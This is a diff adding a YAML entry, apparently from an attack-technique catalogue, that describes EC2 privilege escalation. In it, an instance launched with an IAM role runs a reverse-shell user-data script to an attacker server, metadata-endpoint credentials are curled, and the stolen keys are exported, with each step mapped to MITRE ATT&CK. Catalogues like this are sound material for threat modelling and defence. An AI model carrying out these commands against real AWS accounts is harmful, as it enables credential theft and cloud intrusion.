@@ -1,0 +1,49 @@
+attack:
+  id: "ec2-iam-role-metadata-privesc"
+  name: "EC2 Privilege Escalation via IAM Role and Metadata Service"
+  overview: >
+    An attacker with EC2 launch permissions creates a new instance with an attached IAM role, then accesses the instance 
+    to steal IAM role credentials from the metadata endpoint. The attacker can use either SSH access or reverse shell via 
+    user data to gain instance access and extract temporary credentials for privilege escalation.
+  steps:
+    - title: "Access Instance via Reverse Shell"
+      command: |
+        aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
+          --iam-instance-profile Name=<instance-profile-name> \
+          --count 1 \
+          --user-data "file:///tmp/rev.sh"
+      dependencies:
+        - "ec2:RunInstances"
+        - "iam:PassRole""
+        - "External reverse shell listener setup"
+      result: >
+        Instance executes reverse shell payload on boot, establishing a connection
+        to an attacker-controlled server.
+      ttp: "T1059.004 - Command and Scripting Interpreter: Unix Shell"
+
+    - title: "Query Instance Metadata for IAM Credentials"
+      command: |
+        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+      dependencies:
+        - "Shell access to EC2 instance"
+        - "Metadata service accessible (IMDSv1 or IMDSv2 with valid token)"
+      result: >
+        Retrieval of temporary AWS credentials including AccessKeyId, SecretAccessKey, and SessionToken from
+        the instance metadata service.
+      ttp: "T1552.005 - Unsecured Credentials: Cloud Instance Metadata API"
+
+    - title: "Extract and Use Stolen Credentials"
+      command: |
+        export AWS_ACCESS_KEY_ID=<extracted-key>; \
+        export AWS_SECRET_ACCESS_KEY=<extracted-secret>; \
+        export AWS_SESSION_TOKEN=<extracted-token>
+      dependencies:
+        - "Valid temporary credentials obtained from the metadata service"
+        - "Permissions associated with the attached IAM role"
+      result: >
+        Attacker can now perform AWS API calls from external systems using the
+        permissions of the stolen IAM role.
+      ttp: "T1550.001 - Use Alternate Authentication Material: Application Access Token"
+      
+  stride_goal:
+    - "Elevation of Privilege"
